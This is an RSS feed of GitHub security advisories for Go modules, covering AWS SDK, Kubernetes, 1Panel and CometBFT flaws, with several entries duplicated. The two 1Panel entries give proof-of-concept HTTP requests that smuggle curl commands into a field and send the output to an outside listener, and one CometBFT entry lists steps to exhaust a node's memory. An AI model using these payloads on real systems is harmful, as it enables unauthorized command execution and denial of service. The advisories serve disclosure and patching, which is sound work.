<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2023-07-06T06:01:27.816Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/aws/aws-sdk-go] AWS S3 Crypto SDK sends an unencrypted hash of the plaintext alongside the ciphertext as a metadata field]]></title>
        <id>https://github.com/advisories/GHSA-6jvc-q2x7-pchv</id>
        <link href="https://github.com/advisories/GHSA-6jvc-q2x7-pchv"/>
        <updated>2023-07-05T23:00:26.000Z</updated>
        <content type="html"><![CDATA[<p>The AWS S3 Crypto SDK sends an unencrypted hash of the plaintext alongside the ciphertext as a metadata field. This hash can be used to brute force the plaintext, if the hash is readable to the attacker. AWS now blocks this metadata field, but older SDK versions still send it.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-2582">https://nvd.nist.gov/vuln/detail/CVE-2022-2582</a></li>
<li><a href="https://github.com/aws/aws-sdk-go/commit/35fa6ddf45c061e0f08d3a3b5119f8f4da38f6d1">https://github.com/aws/aws-sdk-go/commit/35fa6ddf45c061e0f08d3a3b5119f8f4da38f6d1</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0391">https://pkg.go.dev/vuln/GO-2022-0391</a></li>
<li><a href="https://github.com/advisories/GHSA-6jvc-q2x7-pchv">https://github.com/advisories/GHSA-6jvc-q2x7-pchv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6jvc-q2x7-pchv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-12-28T00:30:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] kube-apiserver vulnerable to policy bypass]]></title>
        <id>https://github.com/advisories/GHSA-qc2g-gmh6-95p4</id>
        <link href="https://github.com/advisories/GHSA-qc2g-gmh6-95p4"/>
        <updated>2023-07-05T22:46:59.000Z</updated>
        <content type="html"><![CDATA[<p>Users may be able to launch containers using images that are restricted by ImagePolicyWebhook when using ephemeral containers. Kubernetes clusters are only affected if the ImagePolicyWebhook admission plugin is used together with ephemeral containers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-2727">https://nvd.nist.gov/vuln/detail/CVE-2023-2727</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/118640">https://github.com/kubernetes/kubernetes/issues/118640</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8">https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118356">https://github.com/kubernetes/kubernetes/pull/118356</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118471">https://github.com/kubernetes/kubernetes/pull/118471</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118473">https://github.com/kubernetes/kubernetes/pull/118473</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118474">https://github.com/kubernetes/kubernetes/pull/118474</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118512">https://github.com/kubernetes/kubernetes/pull/118512</a></li>
<li><a href="https://github.com/advisories/GHSA-qc2g-gmh6-95p4">https://github.com/advisories/GHSA-qc2g-gmh6-95p4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qc2g-gmh6-95p4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-03T21:30:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] kube-apiserver vulnerable to policy bypass]]></title>
        <id>https://github.com/advisories/GHSA-qc2g-gmh6-95p4</id>
        <link href="https://github.com/advisories/GHSA-qc2g-gmh6-95p4"/>
        <updated>2023-07-05T22:46:59.000Z</updated>
        <content type="html"><![CDATA[<p>Users may be able to launch containers using images that are restricted by ImagePolicyWebhook when using ephemeral containers. Kubernetes clusters are only affected if the ImagePolicyWebhook admission plugin is used together with ephemeral containers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-2727">https://nvd.nist.gov/vuln/detail/CVE-2023-2727</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/118640">https://github.com/kubernetes/kubernetes/issues/118640</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8">https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118356">https://github.com/kubernetes/kubernetes/pull/118356</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118471">https://github.com/kubernetes/kubernetes/pull/118471</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118473">https://github.com/kubernetes/kubernetes/pull/118473</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118474">https://github.com/kubernetes/kubernetes/pull/118474</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118512">https://github.com/kubernetes/kubernetes/pull/118512</a></li>
<li><a href="https://github.com/advisories/GHSA-qc2g-gmh6-95p4">https://github.com/advisories/GHSA-qc2g-gmh6-95p4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qc2g-gmh6-95p4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-03T21:30:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] kube-apiserver vulnerable to policy bypass]]></title>
        <id>https://github.com/advisories/GHSA-qc2g-gmh6-95p4</id>
        <link href="https://github.com/advisories/GHSA-qc2g-gmh6-95p4"/>
        <updated>2023-07-05T22:46:59.000Z</updated>
        <content type="html"><![CDATA[<p>Users may be able to launch containers using images that are restricted by ImagePolicyWebhook when using ephemeral containers. Kubernetes clusters are only affected if the ImagePolicyWebhook admission plugin is used together with ephemeral containers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-2727">https://nvd.nist.gov/vuln/detail/CVE-2023-2727</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/118640">https://github.com/kubernetes/kubernetes/issues/118640</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8">https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118356">https://github.com/kubernetes/kubernetes/pull/118356</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118471">https://github.com/kubernetes/kubernetes/pull/118471</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118473">https://github.com/kubernetes/kubernetes/pull/118473</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118474">https://github.com/kubernetes/kubernetes/pull/118474</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118512">https://github.com/kubernetes/kubernetes/pull/118512</a></li>
<li><a href="https://github.com/advisories/GHSA-qc2g-gmh6-95p4">https://github.com/advisories/GHSA-qc2g-gmh6-95p4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qc2g-gmh6-95p4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-03T21:30:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] kube-apiserver vulnerable to policy bypass]]></title>
        <id>https://github.com/advisories/GHSA-qc2g-gmh6-95p4</id>
        <link href="https://github.com/advisories/GHSA-qc2g-gmh6-95p4"/>
        <updated>2023-07-05T22:46:59.000Z</updated>
        <content type="html"><![CDATA[<p>Users may be able to launch containers using images that are restricted by ImagePolicyWebhook when using ephemeral containers. Kubernetes clusters are only affected if the ImagePolicyWebhook admission plugin is used together with ephemeral containers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-2727">https://nvd.nist.gov/vuln/detail/CVE-2023-2727</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/118640">https://github.com/kubernetes/kubernetes/issues/118640</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8">https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118356">https://github.com/kubernetes/kubernetes/pull/118356</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118471">https://github.com/kubernetes/kubernetes/pull/118471</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118473">https://github.com/kubernetes/kubernetes/pull/118473</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118474">https://github.com/kubernetes/kubernetes/pull/118474</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/118512">https://github.com/kubernetes/kubernetes/pull/118512</a></li>
<li><a href="https://github.com/advisories/GHSA-qc2g-gmh6-95p4">https://github.com/advisories/GHSA-qc2g-gmh6-95p4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qc2g-gmh6-95p4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-03T21:30:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/1Panel-dev/1Panel] 1Panel vulnerable to ommand injection when entering the container terminal]]></title>
        <id>https://github.com/advisories/GHSA-7x2c-fgx6-xf9h</id>
        <link href="https://github.com/advisories/GHSA-7x2c-fgx6-xf9h"/>
        <updated>2023-07-05T21:38:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The authenticated attacker can craft a malicious payloads to achieve command injection when entering the container terminal.</p>
<ol>
<li>Vulnerability analysis.</li>
</ol>
<pre><code>backend\app\api\v1\terminal.go#ContainerWsSsh
</code></pre>
<p><img alt="image" src="https://user-images.githubusercontent.com/46734380/249119420-045ec192-250d-4d07-a69e-0bd794cddec7.png"></p>
<ol start="2">
<li>vulnerability reproduction.</li>
</ol>
<pre><code>GET /api/v1/containers/exec?cols=80&amp;rows=24&amp;containerid=/bin/bash||curl%20http://192.168.109.1:12345/`whoami`||&amp;user=asd&amp;command=/bin/bash HTTP/1.1
Host: 192.168.109.152:40982
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Sec-WebSocket-Version: 13
Origin: http://192.168.109.152:40982
Sec-WebSocket-Key: cOEWTRgkjxVppuhzAfOUWQ==
Connection: keep-alive, Upgrade
Cookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket
</code></pre>
<ol start="3">
<li>The successful execution of system commands.
<img alt="image" src="https://user-images.githubusercontent.com/46734380/249119520-ed2dcc32-be4a-45d8-9286-f9fb778e87da.png"></li>
</ol>
<p>Affected versions: &lt;= 1.3.5</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been fixed in v1.3.6.</p>
<h3 id="workarounds">Workarounds</h3>
<p>It is recommended to upgrade the version to v1.3.6.</p>
<h3 id="references">References</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/1Panel-dev/1Panel">https://github.com/1Panel-dev/1Panel</a>
Email us at <a href="mailto:wanghe@fit2cloud.com">wanghe@fit2cloud.com</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-7x2c-fgx6-xf9h">https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-7x2c-fgx6-xf9h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36458">https://nvd.nist.gov/vuln/detail/CVE-2023-36458</a></li>
<li><a href="https://github.com/1Panel-dev/1Panel/releases/tag/v1.3.6">https://github.com/1Panel-dev/1Panel/releases/tag/v1.3.6</a></li>
<li><a href="https://github.com/advisories/GHSA-7x2c-fgx6-xf9h">https://github.com/advisories/GHSA-7x2c-fgx6-xf9h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7x2c-fgx6-xf9h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-05T21:38:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/1Panel-dev/1Panel] 1Panel vulnerable to command injection when adding container repositories]]></title>
        <id>https://github.com/advisories/GHSA-q2mx-gpjf-3h8x</id>
        <link href="https://github.com/advisories/GHSA-q2mx-gpjf-3h8x"/>
        <updated>2023-07-05T21:38:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The authenticated attacker can craft a malicious payload to achieve command injection when adding container repositories.</p>
<ol>
<li>Vulnerability analysis.</li>
</ol>
<pre><code>backend\app\api\v1\image_repo.go#create
</code></pre>
<p><img alt="image" src="https://user-images.githubusercontent.com/46734380/249118560-8c20dac6-d1be-49d2-b2b2-9a4df9b7cd04.png"></p>
<pre><code>backend\app\service\image_repo.go#CheckConn
</code></pre>
<p><img alt="image" src="https://user-images.githubusercontent.com/46734380/249118639-37b7a1e9-08a9-4316-8beb-39beefdceb33.png"></p>
<ol start="2">
<li>vulnerability reproduction.</li>
</ol>
<pre><code>POST /api/v1/containers/repo HTTP/1.1
Host: 192.168.109.152:40982
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-CSRF-TOKEN: 
Content-Length: 446
Origin: http://192.168.109.152:40982
Connection: close
Referer: http://192.168.109.152:40982/containers/repo
Cookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e
</code></pre>
<pre><code>{"id":2,"createdAt":"2023-04-13T19:57:43.633643247-07:00","name":"asdasd","downloadUrl":"127.0.0.1:8080","protocol":"http","username":"admin||curl http://192.168.109.1:12345/`ls`||","auth":true,"status":"Failed","message":"stderr: WARNING! Using --password via the CLI is insecure. Use --password-stdin.\nError response from daemon: Get \"http://127.0.0.1:8080/v2/\": dial tcp 127.0.0.1:8080: connect: connection refused\n","password":"Passw0rd"}
</code></pre>
<ol start="3">
<li>Using update can be triggered multiple times.</li>
</ol>
<pre><code>POST /api/v1/containers/repo/update HTTP/1.1
Host: 192.168.109.152:40982
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-CSRF-TOKEN: 
Content-Length: 447
Origin: http://192.168.109.152:40982
Connection: close
Referer: http://192.168.109.152:40982/containers/repo
Cookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e
</code></pre>
<pre><code>{"id":2,"createdAt":"2023-04-13T19:57:43.633643247-07:00","name":"asdasd","downloadUrl":"127.0.0.1:8080","protocol":"http","username":"admin||curl http://192.168.109.1:12345/`pwd`||","auth":true,"status":"Failed","message":"stderr: WARNING! Using --password via the CLI is insecure. Use --password-stdin.\nError response from daemon: Get \"http://127.0.0.1:8080/v2/\": dial tcp 127.0.0.1:8080: connect: connection refused\n","password":"Passw0rd"}
</code></pre>
<p>Affected versions: &lt;= 1.3.5</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been fixed in v1.3.6.</p>
<h3 id="workarounds">Workarounds</h3>
<p>It is recommended to upgrade the version to v1.3.6.</p>
<h3 id="references">References</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/1Panel-dev/1Panel">https://github.com/1Panel-dev/1Panel</a>
Email us at <a href="mailto:wanghe@fit2cloud.com">wanghe@fit2cloud.com</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-q2mx-gpjf-3h8x">https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-q2mx-gpjf-3h8x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36457">https://nvd.nist.gov/vuln/detail/CVE-2023-36457</a></li>
<li><a href="https://github.com/1Panel-dev/1Panel/releases/tag/v1.3.6">https://github.com/1Panel-dev/1Panel/releases/tag/v1.3.6</a></li>
<li><a href="https://github.com/advisories/GHSA-q2mx-gpjf-3h8x">https://github.com/advisories/GHSA-q2mx-gpjf-3h8x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q2mx-gpjf-3h8x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-05T21:38:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cometbft/cometbft] CometBFT may duplicate transactions in the mempool's data structures]]></title>
        <id>https://github.com/advisories/GHSA-w24w-wp77-qffm</id>
        <link href="https://github.com/advisories/GHSA-w24w-wp77-qffm"/>
        <updated>2023-07-05T21:34:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The mempool maintains two data structures to keep track of outstanding transactions: a list and a map.
These two data structures are supposed to be in sync all the time in the sense that the map tracks the index (if any) of the transaction in the list. </p>
<p>Unfortunately, it is possible to have them out of sync. When this happens, the list may contain several copies of the same transaction.
Because the map tracks a single index, it is then no longer possible to remove all the copies of the transaction from the list.
This happens  even if the duplicated transaction is later committed in a block.
The only way to remove the transaction is by restarting the node.</p>
<p>These are the steps to cause the above duplication problem. Everything should happen within one height, that is no <code>FinalizeBlock</code> or <code>BeginBlock</code> ABCI calls should happen while these steps are reproduced:</p>
<ol>
<li>send transaction tx1 to the target full node via RPC</li>
<li>send N more different transactions to the target full node, where N should be higher than the node's configured value for <code>cache_size</code> in <code>config.toml</code></li>
<li>send transaction tx1 again to the target full node</li>
</ol>
<p>One of the copies of tx1 is now <em>stuck</em> in the mempool's data structures. Effectively causing a memory leak, and having that node gossiping that transaction to its peers forever.</p>
<p>The above problem can be repeated on and on until a sizable number of transactions are stuck in the mempool, in order to try to bring down the target node.</p>
<p>This problem is present in releases: <code>v0.37.0</code>, and <code>v0.37.1</code>, as well as in <code>v0.34.28</code>, and all previous releases of the CometBFT repo. It will be fixed in releases <code>v0.34.29</code> and <code>v0.37.2</code>.</p>
<h3 id="patches">Patches</h3>
<p>The PR containing the fix is <a href="https://github.com/cometbft/cometbft/pull/890">here</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Increasing the value of <code>cache_size</code> in <code>config.toml</code> makes it very difficult to effectively attack a full node.</li>
<li>Not exposing the transaction submission RPC's would mitigate the probability of a successful attack, as the attacker would then have to create a modified (byzantine) full node to be able to perform the attack via p2p.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tendermint/tendermint/pull/2778">PR</a> that introduced the map to track transactions in the mempool.</li>
<li><a href="https://github.com/cometbft/cometbft/pull/890">PR</a> containing the fix.</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cometbft/cometbft/security/advisories/GHSA-w24w-wp77-qffm">https://github.com/cometbft/cometbft/security/advisories/GHSA-w24w-wp77-qffm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34451">https://nvd.nist.gov/vuln/detail/CVE-2023-34451</a></li>
<li><a href="https://github.com/cometbft/cometbft/pull/890">https://github.com/cometbft/cometbft/pull/890</a></li>
<li><a href="https://github.com/tendermint/tendermint/pull/2778">https://github.com/tendermint/tendermint/pull/2778</a></li>
<li><a href="https://github.com/advisories/GHSA-w24w-wp77-qffm">https://github.com/advisories/GHSA-w24w-wp77-qffm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w24w-wp77-qffm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-07-05T21:34:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cometbft/cometbft] CometBFT may duplicate transactions in the mempool's data structures]]></title>
        <id>https://github.com/advisories/GHSA-w24w-wp77-qffm</id>
        <link href="https://github.com/advisories/GHSA-w24w-wp77-qffm"/>
        <updated>2023-07-05T21:34:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The mempool maintains two data structures to keep track of outstanding transactions: a list and a map.
These two data structures are supposed to be in sync all the time in the sense that the map tracks the index (if any) of the transaction in the list. </p>
<p>Unfortunately, it is possible to have them out of sync. When this happens, the list may contain several copies of the same transaction.
Because the map tracks a single index, it is then no longer possible to remove all the copies of the transaction from the list.
This happens  even if the duplicated transaction is later committed in a block.
The only way to remove the transaction is by restarting the node.</p>
<p>These are the steps to cause the above duplication problem. Everything should happen within one height, that is no <code>FinalizeBlock</code> or <code>BeginBlock</code> ABCI calls should happen while these steps are reproduced:</p>
<ol>
<li>send transaction tx1 to the target full node via RPC</li>
<li>send N more different transactions to the target full node, where N should be higher than the node's configured value for <code>cache_size</code> in <code>config.toml</code></li>
<li>send transaction tx1 again to the target full node</li>
</ol>
<p>One of the copies of tx1 is now <em>stuck</em> in the mempool's data structures. Effectively causing a memory leak, and having that node gossiping that transaction to its peers forever.</p>
<p>The above problem can be repeated on and on until a sizable number of transactions are stuck in the mempool, in order to try to bring down the target node.</p>
<p>This problem is present in releases: <code>v0.37.0</code>, and <code>v0.37.1</code>, as well as in <code>v0.34.28</code>, and all previous releases of the CometBFT repo. It will be fixed in releases <code>v0.34.29</code> and <code>v0.37.2</code>.</p>
<h3 id="patches">Patches</h3>
<p>The PR containing the fix is <a href="https://github.com/cometbft/cometbft/pull/890">here</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Increasing the value of <code>cache_size</code> in <code>config.toml</code> makes it very difficult to effectively attack a full node.</li>
<li>Not exposing the transaction submission RPC's would mitigate the probability of a successful attack, as the attacker would then have to create a modified (byzantine) full node to be able to perform the attack via p2p.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tendermint/tendermint/pull/2778">PR</a> that introduced the map to track transactions in the mempool.</li>
<li><a href="https://github.com/cometbft/cometbft/pull/890">PR</a> containing the fix.</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cometbft/cometbft/security/advisories/GHSA-w24w-wp77-qffm">https://github.com/cometbft/cometbft/security/advisories/GHSA-w24w-wp77-qffm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34451">https://nvd.nist.gov/vuln/detail/CVE-2023-34451</a></li>
<li><a href="https://github.com/cometbft/cometbft/pull/890">https://github.com/cometbft/cometbft/pull/890</a></li>
<li><a href="https://github.com/tendermint/tendermint/pull/2778">https://github.com/tendermint/tendermint/pull/2778</a></li>
<li><a href="https://github.com/advisories/GHSA-w24w-wp77-qffm">https://github.com/advisories/GHSA-w24w-wp77-qffm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w24w-wp77-qffm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-07-05T21:34:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cometbft/cometbft] CometBFT PeerState JSON serialization deadlock]]></title>
        <id>https://github.com/advisories/GHSA-mvj3-qrqh-cjvr</id>
        <link href="https://github.com/advisories/GHSA-mvj3-qrqh-cjvr"/>
        <updated>2023-07-05T21:33:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An internal modification to the way struct <code>PeerState</code> is serialized to JSON introduced a deadlock when new function MarshallJSON is called. This function can be called from two places:</p>
<ol>
<li>Via logs<ul>
<li>Setting the <code>consensus</code> logging module to "debug" level (should not happen in production), and</li>
<li>Setting the log output format to JSON</li>
</ul>
</li>
<li>Via RPC <code>dump_consensus_state</code></li>
</ol>
<p>Case 1 above, which should not be hit in production, will eventually hit the deadlock in most goroutines, effectively halting the node.</p>
<p>In case 2, only the data structures related to the first peer will be deadlocked, together with the thread(s) dealing with the RPC request(s). This means that only one of the channels of communication to the node's peers will be blocked. Eventually the peer will timeout and excluded from the list (typically after 2 minutes). The goroutines involved in the deadlock will not be garbage collected, but they will not interfere with the system after the peer is excluded.</p>
<p>The theoretical worst case for case 2, is a network with only two validator nodes. In this case, each of the nodes only has one <code>PeerState</code> struct. If <code>dump_consensus_state</code> is called in either node (or both), the chain will halt until the peer connections time out, after which the nodes will reconnect (with different <code>PeerState</code> structs) and the chain will progress again. Then, the same process can be repeated.</p>
<p>As the number of nodes in a network increases, and thus, the number of peer struct each node maintains, the possibility of reproducing the perturbation visible with 2 nodes decreases. Only the first <code>PeerState</code> struct will deadlock, and not the others (RPC <code>dump_consensus_state</code> accesses them in a for loop, so the deadlock at the first iteration causes the rest of the iterations of that "for" loop to never be reached).</p>
<p>This regression was introduced in versions <code>v0.34.28</code> and <code>v0.37.1</code>, and will be fixed in <code>v0.34.29</code> and <code>v0.37.2</code>.</p>
<h3 id="patches">Patches</h3>
<p>The PR containing the fix is <a href="https://github.com/cometbft/cometbft/pull/865">here</a>, and the corresponding issue is <a href="https://github.com/cometbft/cometbft/pull/863">here</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>For case 1 (hitting the deadlock via logs)</p>
<ul>
<li>either don't set the log output to "json", leave at "plain",</li>
<li>or don't set the consensus logging module to "debug", leave it at "info" or higher.</li>
</ul>
<p>For case 2 (hitting the deadlock via RPC <code>dump_consensus_state</code>)</p>
<ul>
<li>do not expose <code>dump_consensus_state</code> RPC endpoint to the public internet (e.g., via rules in your nginx setup)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cometbft/cometbft/pull/863">Issue</a> that introduced the deadlock</li>
<li><a href="https://github.com/cometbft/cometbft/pull/524">Issue</a> reporting the bug via logs</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cometbft/cometbft/security/advisories/GHSA-mvj3-qrqh-cjvr">https://github.com/cometbft/cometbft/security/advisories/GHSA-mvj3-qrqh-cjvr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34450">https://nvd.nist.gov/vuln/detail/CVE-2023-34450</a></li>
<li><a href="https://github.com/cometbft/cometbft/pull/524">https://github.com/cometbft/cometbft/pull/524</a></li>
<li><a href="https://github.com/cometbft/cometbft/pull/863">https://github.com/cometbft/cometbft/pull/863</a></li>
<li><a href="https://github.com/cometbft/cometbft/pull/865">https://github.com/cometbft/cometbft/pull/865</a></li>
<li><a href="https://github.com/advisories/GHSA-mvj3-qrqh-cjvr">https://github.com/advisories/GHSA-mvj3-qrqh-cjvr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mvj3-qrqh-cjvr</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-07-05T21:33:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cometbft/cometbft] CometBFT PeerState JSON serialization deadlock]]></title>
        <id>https://github.com/advisories/GHSA-mvj3-qrqh-cjvr</id>
        <link href="https://github.com/advisories/GHSA-mvj3-qrqh-cjvr"/>
        <updated>2023-07-05T21:33:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An internal modification to the way struct <code>PeerState</code> is serialized to JSON introduced a deadlock when new function MarshallJSON is called. This function can be called from two places:</p>
<ol>
<li>Via logs<ul>
<li>Setting the <code>consensus</code> logging module to "debug" level (should not happen in production), and</li>
<li>Setting the log output format to JSON</li>
</ul>
</li>
<li>Via RPC <code>dump_consensus_state</code></li>
</ol>
<p>Case 1 above, which should not be hit in production, will eventually hit the deadlock in most goroutines, effectively halting the node.</p>
<p>In case 2, only the data structures related to the first peer will be deadlocked, together with the thread(s) dealing with the RPC request(s). This means that only one of the channels of communication to the node's peers will be blocked. Eventually the peer will timeout and excluded from the list (typically after 2 minutes). The goroutines involved in the deadlock will not be garbage collected, but they will not interfere with the system after the peer is excluded.</p>
<p>The theoretical worst case for case 2, is a network with only two validator nodes. In this case, each of the nodes only has one <code>PeerState</code> struct. If <code>dump_consensus_state</code> is called in either node (or both), the chain will halt until the peer connections time out, after which the nodes will reconnect (with different <code>PeerState</code> structs) and the chain will progress again. Then, the same process can be repeated.</p>
